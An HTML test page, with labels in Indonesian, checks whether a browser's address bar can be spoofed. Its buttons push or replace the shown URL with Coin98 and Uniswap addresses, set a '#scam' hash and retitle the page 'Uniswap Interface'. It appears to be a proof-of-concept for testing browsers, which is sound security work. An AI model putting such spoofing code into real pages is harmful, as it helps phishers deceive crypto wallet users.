<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Navigation / Address Bar Test</title>
  <style>
    body { font-family: system-ui; padding: 16px; background: #0f0f0f; color: #e0e0e0; }
    button { margin: 6px 4px; padding: 10px 14px; border-radius: 8px; border: none; background: #3b82f6; color: white; }
    pre { background: #1a1a1a; padding: 12px; border-radius: 8px; font-size: 13px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>Navigation / Address Bar Spoof Test</h2>
  <p>Perhatikan apakah address bar berubah setelah menekan tombol.</p>
  <button onclick="tryHistory()">history.replaceState</button>
  <button onclick="tryPushState()">history.pushState</button>
  <button onclick="tryLocation()">location manipulation</button>
  <button onclick="tryTitle()">Ubah document.title</button>
  <pre id="log">Siap...</pre>

  <script>
    const logEl = document.getElementById('log');
    function log(msg) { logEl.textContent += msg + '\n'; }

    function tryHistory() {
      try {
        history.replaceState(null, '', 'https://www.coin98.com/secure');
        log('history.replaceState → https://www.coin98.com/secure');
        log('Cek address bar sekarang!');
      } catch(e) {
        log('Error: ' + e.message);
      }
    }

    function tryPushState() {
      try {
        history.pushState(null, '', 'https://app.uniswap.org/');
        log('history.pushState → https://app.uniswap.org/');
      } catch(e) {
        log('Error: ' + e.message);
      }
    }

    function tryLocation() {
      log('location.hash = #scam');
      location.hash = 'scam';
      // Jangan pakai location.href = '...' karena akan pindah halaman beneran
    }

    function tryTitle() {
      document.title = 'Uniswap Interface';
      log('document.title diubah menjadi: Uniswap Interface');
    }
  </script>
</body>
</html>
